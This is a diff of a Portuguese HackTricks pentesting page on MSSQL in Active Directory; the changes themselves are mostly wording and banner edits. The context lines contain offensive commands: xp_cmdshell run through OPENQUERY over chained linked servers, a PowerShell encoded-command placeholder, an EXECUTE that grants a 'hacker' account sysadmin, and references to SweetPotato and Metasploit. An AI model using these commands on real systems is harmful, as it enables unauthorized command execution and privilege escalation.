@@ -4,7 +4,7 @@
 
 <summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
@@ -12,12 +12,12 @@
 
 </details>
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
 
-## **Enumeração / Descoberta do MSSQL**
+## **Enumeração / Descoberta MSSQL**
 
 O módulo powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) é muito útil nesse caso.
 ```powershell
@@ -81,6 +81,10 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 Verifique na página mencionada na **seção seguinte como fazer isso manualmente.**
 
+{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
+[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
+{% endcontent-ref %}
+
 ## Links Confiáveis do MSSQL
 
 Se uma instância do MSSQL é confiável (link de banco de dados) por uma instância diferente do MSSQL. Se o usuário tiver privilégios sobre o banco de dados confiável, ele poderá **usar o relacionamento de confiança para executar consultas também na outra instância**. Essas confianças podem ser encadeadas e, em algum momento, o usuário pode ser capaz de encontrar algum banco de dados mal configurado onde ele pode executar comandos.
@@ -129,13 +133,15 @@ msf> use exploit/windows/mssql/mssql_linkcrawler
 ```
 ### Manual - Openquery()
 
-No **Linux**, você poderia obter um shell de console MSSQL com **sqsh** e **mssqlclient.py**.
+A partir do **Linux**, você pode obter um shell de console MSSQL com **sqsh** e **mssqlclient.py**.
 
-No **Windows**, você também poderia encontrar os links e executar comandos manualmente usando um cliente MSSQL como [**HeidiSQL**](https://www.heidisql.com)
+No **Windows**, você também pode encontrar os links e executar comandos manualmente usando um **cliente MSSQL como** [**HeidiSQL**](https://www.heidisql.com)
 
 _Login usando autenticação do Windows:_
 
 ![](<../../.gitbook/assets/image (805).png>)
+
+#### Encontrar Links Confiáveis
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
@@ -162,6 +168,8 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
+Se não conseguir realizar ações como `exec xp_cmdshell` a partir de `openquery()`, tente com o método `EXECUTE`.
+
 ### Manual - EXECUTE
 
 Também é possível abusar de links confiáveis usando `EXECUTE`:
@@ -174,12 +182,12 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 O usuário local do **MSSQL** geralmente possui um tipo especial de privilégio chamado **`SeImpersonatePrivilege`**. Isso permite que a conta "impersonate a client after authentication" (impersonar um cliente após autenticação).
 
-Uma estratégia que muitos autores desenvolveram é forçar um serviço **SYSTEM** a autenticar em um serviço falso ou man-in-the-middle criado pelo atacante. Esse serviço falso é então capaz de se passar pelo serviço **SYSTEM** enquanto ele tenta se autenticar.
+Uma estratégia que muitos autores desenvolveram é forçar um serviço **SYSTEM** a se autenticar em um serviço falso ou de intermediário criado pelo atacante. Esse serviço falso é então capaz de se passar pelo serviço **SYSTEM** enquanto tenta se autenticar.
 
-[SweetPotato](https://github.com/CCob/SweetPotato) possui uma coleção dessas várias técnicas que podem ser executadas através do comando `execute-assembly` do Beacon.
+[SweetPotato](https://github.com/CCob/SweetPotato) possui uma coleção dessas várias técnicas que podem ser executadas por meio do comando `execute-assembly` do Beacon.
 
 
-<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
